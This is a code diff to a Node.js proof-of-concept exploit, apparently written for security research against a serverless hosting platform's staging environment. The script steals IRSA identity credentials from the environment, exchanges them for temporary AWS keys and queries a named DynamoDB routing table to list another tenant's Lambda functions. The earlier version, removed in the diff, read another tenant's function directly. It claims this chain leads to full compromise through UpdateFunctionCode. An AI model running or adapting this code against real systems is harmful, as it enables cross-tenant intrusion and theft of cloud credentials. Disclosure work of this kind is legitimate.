@@ -5,7 +5,7 @@ function b64urlDecode(s) {
   return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
 }
 
-console.log('=== POC: postinstall RCE + cross-tenant lambda:GetFunction ===\n');
+console.log('=== POC: DynamoDB Query with subdomain-only to enumerate all functions ===\n');
 console.log('1. Extracting IRSA identity...');
 console.log('   AWS_ROLE_ARN =', process.env.AWS_ROLE_ARN);
 console.log('   AWS_WEB_IDENTITY_TOKEN_FILE =', process.env.AWS_WEB_IDENTITY_TOKEN_FILE);
@@ -53,24 +53,24 @@ https.get(`https://sts.${region}.amazonaws.com/?${stsParams}`, res => {
         secretAccessKey: secretKeyMatch[1],
         sessionToken: sessionTokenMatch[1],
       };
-      console.log('   ✓ Got temporary credentials (AccessKeyId:', creds.accessKeyId.slice(0, 12) + '...)');
+      console.log('   ✓ Got temporary credentials');
 
-      // Step 2: Install AWS SDK and use it to call lambda:GetFunction on PROJECT B's function
-      console.log('\n3. Installing AWS SDK for Lambda client...');
+      // Step 2: Install AWS SDK and use it to Query DynamoDB
+      console.log('\n3. Installing AWS SDK for DynamoDB client...');
       const { exec } = require('child_process');
-      exec('npm install --loglevel=error --prefix /tmp/lambda-sdk @aws-sdk/client-lambda@latest', (err, stdout, stderr) => {
+      exec('npm install --loglevel=error --prefix /tmp/dynamo-sdk @aws-sdk/client-dynamodb@latest', (err, stdout, stderr) => {
         if (err) {
           console.log('   ERROR: Failed to install SDK:', err.message);
           process.exit(1);
         }
         console.log('   ✓ SDK installed');
 
-        // Now use the SDK with the temp credentials
-        console.log('\n4. Calling lambda:GetFunction on Project B\'s function (cross-tenant read)...');
+        // Now use the SDK to Query DynamoDB with just the subdomain
+        console.log('\n4. Querying DynamoDB with subdomain-only to enumerate all functions...');
 
-        const { LambdaClient, GetFunctionCommand } = require('/tmp/lambda-sdk/node_modules/@aws-sdk/client-lambda');
+        const { DynamoDBClient, QueryCommand } = require('/tmp/dynamo-sdk/node_modules/@aws-sdk/client-dynamodb');
 
-        const client = new LambdaClient({
+        const client = new DynamoDBClient({
           region: region,
           credentials: {
             accessKeyId: creds.accessKeyId,
@@ -79,27 +79,52 @@ https.get(`https://sts.${region}.amazonaws.com/?${stsParams}`, res => {
           },
         });
 
-        // Project B subdomain: ffvuxtepyautytovdlnf
-        // Function path: functions/hello.js
-        // Function name = sha256(ffvuxtepyautytovdlnf + functions/hello.js)
-        const projectBFunctionName = '423b2e9c64cc5ce6bbe1286baca4c10348cd4e71cde1339da07ad0869585e4d8';
-        console.log('   Target function:', projectBFunctionName);
-        console.log('   Region:', region);
+        // Query the routing table with ONLY the Tenant (subdomain) key
+        // This should return ALL functions for this subdomain without knowing function names
+        const subdomain = 'ffvuxtepyautytovdlnf';
+        const tableName = 'nhost-staging-tenants-functions';
 
-        const command = new GetFunctionCommand({ FunctionName: projectBFunctionName });
+        console.log('   Target table:', tableName);
+        console.log('   Query key (Tenant):', subdomain);
+        console.log('   (No function names provided — we\'re enumerating based on subdomain alone)\n');
+
+        const command = new QueryCommand({
+          TableName: tableName,
+          KeyConditionExpression: 'Tenant = :tenant',
+          ExpressionAttributeValues: {
+            ':tenant': { S: subdomain },
+          },
+          ProjectionExpression: 'Route,Lambda,AppID',
+        });
+
         client.send(command)
           .then(response => {
-            console.log('   ✓ SUCCESS: Read Project B\'s function metadata');
-            console.log('     Function ARN:', response.Configuration.FunctionArn);
-            console.log('     Function name:', response.Configuration.FunctionName);
-            console.log('     Runtime:', response.Configuration.Runtime);
-            console.log('     Last modified:', response.Configuration.LastModified);
-            console.log('\n   ⚠️  FINDING 3 VERIFIED: Cross-tenant lambda:GetFunction succeeded!');
+            if (!response.Items || response.Items.length === 0) {
+              console.log('   ℹ️  Query returned no items (table might be empty or key mismatch)');
+              return;
+            }
+
+            console.log('   ✓ SUCCESS: Enumerated all functions via subdomain-only query!\n');
+            console.log('   Found ' + response.Items.length + ' function(s) for subdomain ' + subdomain + ':\n');
+
+            response.Items.forEach((item, idx) => {
+              const route = item.Route?.S || 'unknown';
+              const lambda = item.Lambda?.S || 'unknown';
+              const appId = item.AppID?.S || 'unknown';
+              console.log(`   [${idx + 1}] Route: ${route}`);
+              console.log(`       Lambda (function name): ${lambda}`);
+              console.log(`       AppID: ${appId}\n`);
+            });
+
+            console.log('   ⚠️  CRITICAL: Subdomain alone is sufficient to:');
+            console.log('       1. Enumerate ALL functions for any tenant');
+            console.log('       2. Get the exact Lambda function names (no sha256 guessing needed)');
+            console.log('       3. Combined with lambda:UpdateFunctionCode on Resource:*, enables full compromise');
           })
           .catch(error => {
-            console.log('   HTTP error:', error.message);
-            if (error.$metadata?.httpStatusCode === 403) {
-              console.log('   (403 Forbidden — function may not be deployed yet, or account mismatch)');
+            console.log('   ERROR:', error.message);
+            if (error.$metadata?.httpStatusCode === 400) {
+              console.log('   (400 Bad Request — table name or key schema might be wrong)');
             }
           });
       });
